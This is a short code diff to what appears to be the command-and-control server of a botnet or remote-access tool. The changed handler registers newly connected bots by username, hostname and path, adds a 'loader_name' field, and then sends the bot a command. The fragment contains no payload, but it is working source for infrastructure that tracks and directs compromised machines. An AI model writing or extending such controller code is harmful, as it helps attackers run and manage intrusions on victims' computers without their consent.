@@ -302,10 +302,11 @@ class BotController(BaseHTTPRequestHandler):
                 username = data["username"]
                 hostname = data["hostname"]
                 local_path = data["path"]
+                loader_name = data["loader_name"]
 
                 if not self._model.is_known_bot(bot_uid):
                     # This is the first time this bot connected.
-                    self._model.add_bot(Bot(bot_uid, username, hostname, time(), local_path))
+                    self._model.add_bot(Bot(bot_uid, username, hostname, time(), local_path, loader_name))
                     self._update_bot_amount()
 
                     self._send_command()
